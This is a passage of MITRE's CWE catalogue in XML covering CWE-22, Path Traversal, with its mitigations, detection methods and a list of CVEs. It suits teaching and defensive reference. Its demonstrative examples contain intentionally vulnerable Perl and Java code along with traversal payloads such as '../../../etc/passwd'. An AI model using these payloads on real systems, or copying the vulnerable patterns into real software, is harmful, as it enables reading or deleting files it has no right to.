					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
			<Previous_Entry_Name Date="2020-02-24">Sensitive Data Under Web Root</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="22" Name="Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')" Abstraction="Base" Structure="Simple" Status="Stable">
         <Description>The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory.</Description>
         <Extended_Description>
            <xhtml:p>Many file operations are intended to take place within a restricted directory. By using special elements such as ".." and "/" separators, attackers can escape outside of the restricted location to access files or directories that are elsewhere on the system. One of the most common special elements is the "../" sequence, which in most modern operating systems is interpreted as the parent directory of the current location. This is referred to as relative path traversal. Path traversal also covers the use of absolute pathnames such as "/usr/local/bin", which may also be useful in accessing unexpected files. This is referred to as absolute path traversal.</xhtml:p>
            <xhtml:p>In many programming languages, the injection of a null byte (the 0 or NUL) may allow an attacker to truncate a generated filename to widen the scope of attack. For example, the product may add ".txt" to any pathname, thus limiting the attacker to text files, but a null injection may effectively remove this restriction.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="706" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="706" View_ID="1003" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="668" View_ID="1000"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
            <Weakness_Ordinality>
               <Ordinality>Resultant</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Directory traversal</Term>
            </Alternate_Term>
            <Alternate_Term>
               <Term>Path traversal</Term>
               <Description>"Path traversal" is preferred over "directory traversal," but both terms are attack-focused.</Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Note>The attacker may be able to create or overwrite critical files that are used to execute code, such as programs or libraries.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Files or Directories</Impact>
               <Note>The attacker may be able to overwrite or create critical files, such as programs, libraries, or important data. If the targeted file is used for a security mechanism, then the attacker may be able to bypass that mechanism. For example, appending a new account at the end of a password file may allow an attacker to bypass authentication.</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Files or Directories</Impact>
               <Note>The attacker may be able read the contents of unexpected files and expose sensitive data. If the targeted file is used for a security mechanism, then the attacker may be able to bypass that mechanism. For example, by reading a password file, the attacker could conduct brute force password guessing attacks in order to break into an account on the system.</Note>
            </Consequence>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>DoS: Crash, Exit, or Restart</Impact>
               <Note>The attacker may be able to overwrite, delete, or corrupt unexpected critical files such as programs, libraries, or important data. This may prevent the product from working at all and in the case of a protection mechanisms such as authentication, it has the potential to lockout every user of the product.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method>Automated Static Analysis</Method>
               <Description>Automated techniques can find areas where path traversal weaknesses exist. However, tuning or customization may be required to remove or de-prioritize path-traversal problems that are only exploitable by the product's administrator - or other privileged users - and thus potentially valid behavior or, at worst, a bug instead of a vulnerability.</Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis</Method>
               <Description>Manual white box techniques may be able to provide sufficient code coverage and reduction of false positives if all file access operations can be assessed within limited time constraints.</Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Bytecode Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Binary Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Binary / Bytecode disassembler - then use manual analysis for vulnerabilities &amp; anomalies</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Automated Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Web Application Scanner</xhtml:li>
                           <xhtml:li>Web Services Scanner</xhtml:li>
                           <xhtml:li>Database Scanners</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Fuzz Tester</xhtml:li>
                           <xhtml:li>Framework-based Fuzzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Focused Manual Spotcheck - Focused manual analysis of source</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Source code Weakness Analyzer</xhtml:li>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-5.1">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs.  This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
                  <xhtml:p>When validating filenames, use stringent allowlists that limit the character set to be used. If feasible, only allow a single "." character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as "/" to avoid CWE-36. Use a list of allowable file extensions, which will help to avoid CWE-434.</xhtml:p>
                  <xhtml:p>Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a denylist, which may be incomplete (CWE-184). For example, filtering "/" is insufficient protection if the filesystem also supports the use of "\" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if "../" sequences are removed from the ".../...//" string in a sequential fashion, two instances of "../" would be removed from the original string, but the remaining characters would still form the "../" string.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-15">
               <Phase>Architecture and Design</Phase>
               <Description>For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-20.1">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked.</xhtml:p>
                  <xhtml:p>Use a built-in path canonicalization function (such as realpath() in C) that produces the canonical version of the pathname, which effectively removes ".." sequences and symbolic links (CWE-23, CWE-59). This includes:</xhtml:p>
                     <xhtml:ul>
                        <xhtml:li>realpath() in C</xhtml:li>
                        <xhtml:li>getCanonicalPath() in Java</xhtml:li>
                        <xhtml:li>GetFullPath() in ASP.NET</xhtml:li>
                        <xhtml:li>realpath() or abs_path() in Perl</xhtml:li>
                        <xhtml:li>realpath() in PHP</xhtml:li>
                     </xhtml:ul>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-4">
               <Phase>Architecture and Design</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-29">
               <Phase>Operation</Phase>
               <Strategy>Firewall</Strategy>
               <Description>Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.</Description>
               <Effectiveness>Moderate</Effectiveness>
               <Effectiveness_Notes>An application firewall might not cover all possible input vectors. In addition, attack techniques might be available to bypass the protection mechanism, such as using malformed inputs that can still be processed by the component that receives those inputs. Depending on functionality, an application firewall might inadvertently reject or modify legitimate requests. Finally, some manual effort may be required for customization.</Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-17">
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Strategy>Environment Hardening</Strategy>
               <Description>Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-21.1">
               <Phase>Architecture and Design</Phase>
               <Strategy>Enforcement by Conversion</Strategy>
               <Description>
                  <xhtml:p>When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.</xhtml:p>
                  <xhtml:p>For example, ID 1 could map to "inbox.txt" and ID 2 could map to "profile.txt". Features such as the ESAPI AccessReferenceMap [REF-185] provide this capability.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-22">
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Strategy>Sandbox or Jail</Strategy>
               <Description>
                  <xhtml:p>Run the code in a "jail" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.</xhtml:p>
                  <xhtml:p>OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.</xhtml:p>
                  <xhtml:p>This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.</xhtml:p>
                  <xhtml:p>Be careful to avoid CWE-243 and other weaknesses related to jails.</xhtml:p>
               </Description>
               <Effectiveness>Limited</Effectiveness>
               <Effectiveness_Notes>The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed.</Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-34">
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Strategy>Attack Surface Reduction</Strategy>
               <Description>
                  <xhtml:p>Store library, include, and utility files outside of the web document root, if possible. Otherwise, store them in a separate directory and use the web server's access control capabilities to prevent attackers from directly requesting them. One common practice is to define a fixed constant in each calling program, then check for the existence of the constant in the library/include file; if the constant does not exist, then the file was directly requested, and it can exit immediately.</xhtml:p>
                  <xhtml:p>This significantly reduces the chance of an attacker being able to bypass any protection mechanisms that are in the base program but not in the include files. It will also reduce the attack surface.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-39">
               <Phase>Implementation</Phase>
               <Description>
                  <xhtml:p>Ensure that error messages only contain minimal details that are useful to the intended audience and no one else. The messages need to strike the balance between being too cryptic (which can confuse users) or being too detailed (which may reveal more than intended). The messages should not reveal the methods that were used to determine the error. Attackers can use detailed information to refine or optimize their original attack, thereby increasing their chances of success.</xhtml:p>
                  <xhtml:p>If errors must be captured in some detail, record them in log messages, but consider what could occur if the log messages can be viewed by attackers. Highly sensitive information such as passwords should never be saved to log files.</xhtml:p>
		  <xhtml:p>Avoid inconsistent messaging that might accidentally tip off an attacker about internal state, such as whether a user account exists or not.</xhtml:p>
                  <xhtml:p>In the context of path traversal, error messages which disclose path information can help attackers craft the appropriate attack strings to move through the file system hierarchy.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-16">
               <Phase>Operation</Phase>
               <Phase>Implementation</Phase>
               <Strategy>Environment Hardening</Strategy>
               <Description>When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-27">
               <Intro_Text>The following code could be for a social networking application in which each user's profile information is stored in a separate file. All files are stored in a single directory.</Intro_Text>
               <Example_Code Nature="Bad" Language="Perl">
                  <xhtml:div>my $dataPath = "/users/cwe/profiles";<xhtml:br/>my $username = param("user");<xhtml:br/>my $profilePath = $dataPath . "/" . $username;<xhtml:br/>
                     <xhtml:br/>open(my $fh, "&lt;", $profilePath) || ExitError("profile read error: $profilePath");<xhtml:br/>print "&lt;ul&gt;\n";<xhtml:br/>while (&lt;$fh&gt;) {<xhtml:div style="margin-left:1em;">print "&lt;li&gt;$_&lt;/li&gt;\n";</xhtml:div>}<xhtml:br/>print "&lt;/ul&gt;\n";</xhtml:div>
               </Example_Code>
               <Body_Text>While the programmer intends to access files such as "/users/cwe/profiles/alice" or "/users/cwe/profiles/bob", there is no verification of the incoming user parameter. An attacker could provide a string such as:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>../../../etc/passwd</xhtml:div>
               </Example_Code>
               <Body_Text>The program would generate a profile pathname like this:</Body_Text>
               <Example_Code Nature="Result">
                  <xhtml:div>/users/cwe/profiles/../../../etc/passwd</xhtml:div>
               </Example_Code>
               <Body_Text>When the file is opened, the operating system resolves the "../" during path canonicalization and actually accesses this file:</Body_Text>
               <Example_Code Nature="Result">
                  <xhtml:div>/etc/passwd</xhtml:div>
               </Example_Code>
               <Body_Text>As a result, the attacker could read the entire text of the password file.</Body_Text>
               <Body_Text>Notice how this code also contains an error message information leak (CWE-209) if the user parameter does not produce a file that exists: the full pathname is provided. Because of the lack of output encoding of the file that is retrieved, there might also be a cross-site scripting problem (CWE-79) if profile contains any HTML, but other code would need to be examined.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-18">
               <Intro_Text>In the example below, the path to a dictionary file is read from a system property and used to initialize a File object.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>String filename = System.getProperty("com.domain.application.dictionaryFile");<xhtml:br/>File dictionaryFile = new File(filename);</xhtml:div>
               </Example_Code>
               <Body_Text>However, the path is not validated or modified to prevent it from containing relative or absolute path sequences before creating the File object. This allows anyone who can control the system property to determine what file is used. Ideally, the path should be resolved relative to some kind of application or user home directory.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-2">
               <Intro_Text>The following code takes untrusted input and uses a regular expression to filter "../" from the input. It then appends this result to the /home/user/ directory and attempts to read the file in the final resulting path.</Intro_Text>
               <Example_Code Nature="Bad" Language="Perl">
                  <xhtml:div>my $Username = GetUntrustedInput();<xhtml:br/>$Username =~ s/\.\.\///;<xhtml:br/>my $filename = "/home/user/" . $Username;<xhtml:br/>ReadAndSendFile($filename);</xhtml:div>
               </Example_Code>
               <Body_Text>Since the regular expression does not have the /g global match modifier, it only removes the first instance of "../" it comes across. So an input value such as:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>../../../etc/passwd</xhtml:div>
               </Example_Code>
               <Body_Text>will have the first "../" stripped, resulting in:</Body_Text>
               <Example_Code Nature="Result">
                  <xhtml:div>../../etc/passwd</xhtml:div>
               </Example_Code>
               <Body_Text>This value is then concatenated with the /home/user/ directory:</Body_Text>
               <Example_Code Nature="Result">
                  <xhtml:div>/home/user/../../etc/passwd</xhtml:div>
               </Example_Code>
               <Body_Text>which causes the /etc/passwd file to be retrieved once the operating system has resolved the ../ sequences in the pathname. This leads to relative path traversal (CWE-23).</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following code attempts to validate a given input path by checking it against an allowlist and once validated delete the given file. In this specific case, the path is considered valid if it starts with the string "/safe_dir/".</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>String path = getInputPath();<xhtml:br/>if (path.startsWith("/safe_dir/"))<xhtml:br/>{<xhtml:div style="margin-left:1em;">File f = new File(path);<xhtml:br/>f.delete()</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>An attacker could provide an input such as this:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>/safe_dir/../important.dat</xhtml:div>
               </Example_Code>
               <Body_Text>The software assumes that the path is valid because it starts with the "/safe_path/" sequence, but the "../" sequence will cause the program to delete the important.dat file in the parent directory</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-22">
               <Intro_Text>The following code demonstrates the unrestricted upload of a file with a Java servlet and a path traversal vulnerability. The action attribute of an HTML form is sending the upload file request to the Java servlet.</Intro_Text>
               <Example_Code Nature="Good" Language="HTML">
                  <xhtml:div>&lt;form action="FileUploadServlet" method="post" enctype="multipart/form-data"&gt;<xhtml:br/>
                     <xhtml:br/>Choose a file to upload:<xhtml:br/>&lt;input type="file" name="filename"/&gt;<xhtml:br/>&lt;br/&gt;<xhtml:br/>&lt;input type="submit" name="submit" value="Submit"/&gt;<xhtml:br/>
                     <xhtml:br/>&lt;/form&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>When submitted the Java servlet's doPost method will receive the request, extract the name of the file from the Http request header, read the file contents from the request and output the file to the local upload directory.</Body_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>public class FileUploadServlet extends HttpServlet {<xhtml:br/>
                     <xhtml:div style="margin-left:1em;">
                        <xhtml:div>...<xhtml:br/>
                           <xhtml:br/>protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {<xhtml:br/>
                           <xhtml:div style="margin-left:1em;">
                              <xhtml:div>response.setContentType("text/html");<xhtml:br/>PrintWriter out = response.getWriter();<xhtml:br/>String contentType = request.getContentType();<xhtml:br/>
                                 <xhtml:br/>// the starting position of the boundary header<xhtml:br/>int ind = contentType.indexOf("boundary=");<xhtml:br/>String boundary = contentType.substring(ind+9);<xhtml:br/>
                                 <xhtml:br/>String pLine = new String();<xhtml:br/>String uploadLocation = new String(UPLOAD_DIRECTORY_STRING); //Constant value<xhtml:br/>
                                 <xhtml:br/>// verify that content type is multipart form data<xhtml:br/>if (contentType != null &amp;&amp; contentType.indexOf("multipart/form-data") != -1) {<xhtml:br/>
                                 <xhtml:div style="margin-left:1em;">
                                    <xhtml:div>// extract the filename from the Http header<xhtml:br/>BufferedReader br = new BufferedReader(new InputStreamReader(request.getInputStream()));<xhtml:br/>...<xhtml:br/>pLine = br.readLine();<xhtml:br/>String filename = pLine.substring(pLine.lastIndexOf("\\"), pLine.lastIndexOf("\""));<xhtml:br/>...<xhtml:br/>
                                       <xhtml:br/>// output the file to the local upload directory<xhtml:br/>try {<xhtml:div style="margin-left:1em;">
                                          <xhtml:div>BufferedWriter bw = new BufferedWriter(new FileWriter(uploadLocation+filename, true));<xhtml:br/>for (String line; (line=br.readLine())!=null; ) {<xhtml:div style="margin-left:1em;">if (line.indexOf(boundary) == -1) {<xhtml:div style="margin-left:1em;">bw.write(line);<xhtml:br/>bw.newLine();<xhtml:br/>bw.flush();</xhtml:div>}</xhtml:div>} //end of for loop<xhtml:br/>bw.close();</xhtml:div>
                                       </xhtml:div>
                                       <xhtml:br/>
                                       <xhtml:br/>} catch (IOException ex) {...}<xhtml:br/>// output successful upload response HTML page</xhtml:div>
                                 </xhtml:div>}<xhtml:br/>// output unsuccessful upload response HTML page<xhtml:br/>else<xhtml:br/>{...}</xhtml:div>
                           </xhtml:div>}<xhtml:div style="margin-left:1em;">...</xhtml:div>
                        </xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>This code does not perform a check on the type of the file being uploaded (CWE-434). This could allow an attacker to upload any executable file or other file with malicious code.</Body_Text>
               <Body_Text>Additionally, the creation of the BufferedWriter object is subject to relative path traversal (CWE-23). Since the code does not check the filename that is provided in the header, an attacker can use "../" sequences to write to files outside of the intended directory. Depending on the executing environment, the attacker may be able to specify arbitrary files to write to, leading to a wide variety of consequences, from code execution, XSS (CWE-79), or system crash.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2019-20916</Reference>
               <Description>Python package manager does not correctly restrict the filename specified in a Content-Disposition header, allowing arbitrary file read using path traversal sequences such as "../"</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2019-20916</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-31503</Reference>
               <Description>Python package constructs filenames using an unsafe os.path.join call on untrusted input, allowing absolute path traversal because os.path.join resets the pathname to an absolute path that is specified as part of the input.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-31503</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-24877</Reference>
               <Description>directory traversal in Go-based Kubernetes operator app allows accessing data from the controller's pod file system via ../ sequences in a yaml file</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-24877</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2021-21972</Reference>
               <Description>Chain: Cloud computing virtualization platform does not require authentication for upload of a tar format file (CWE-306), then uses .. path traversal sequences (CWE-23) in the file to access unexpected files, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-21972</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-4053</Reference>
               <Description>a Kubernetes package manager written in Go allows malicious plugins to inject path traversal sequences into a plugin archive ("Zip slip") to copy a file outside the intended directory</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-4053</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-3452</Reference>
               <Description>Chain: security product has improper input validation (CWE-20) leading to directory traversal (CWE-22), as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-3452</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2019-10743</Reference>
               <Description>Go-based archive library allows extraction of  files to locations outside of the target folder with "../" path traversal sequences in filenames in a zip file, aka "Zip Slip"</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2019-10743</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2010-0467</Reference>
               <Description>Newsletter module allows reading arbitrary files using "../" sequences.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2010-0467</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-4194</Reference>
               <Description>FTP server allows deletion of arbitrary files using ".." in the DELE command.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-4194</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-4053</Reference>
               <Description>FTP server allows creation of arbitrary directories using ".." in the MKD command.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-4053</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-0244</Reference>
               <Description>FTP service for a Bluetooth device allows listing of directories, and creation or reading of files using ".." sequences.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-0244</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-4013</Reference>
               <Description>Software package maintenance program allows overwriting arbitrary files using "../" sequences.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-4013</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-4449</Reference>
               <Description>Bulletin board allows attackers to determine the existence of files using the avatar.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-4449</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-4581</Reference>
               <Description>PHP program allows arbitrary code execution using ".." in filenames that are fed to the include() function.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-4581</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2010-0012</Reference>
               <Description>Overwrite of files using a .. in a Torrent file.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2010-0012</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2010-0013</Reference>
               <Description>Chat program allows overwriting files using a custom smiley request.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2010-0013</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5748</Reference>
               <Description>Chain: external control of values for user's desired language and theme enables path traversal.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-5748</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-1936</Reference>
               <Description>Chain: library file sends a redirect if it is directly requested but continues to execute, allowing remote file inclusion and path traversal.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-1936</Link>
            </Observed_Example>
         </Observed_Examples>
         <Functional_Areas>
            <Functional_Area>File Processing</Functional_Area>
         </Functional_Areas>
         <Affected_Resources>
            <Affected_Resource>File or Directory</Affected_Resource>
         </Affected_Resources>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Path Traversal</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A4</Entry_ID>
               <Entry_Name>Insecure Direct Object Reference</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A2</Entry_ID>
               <Entry_Name>Broken Access Control</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
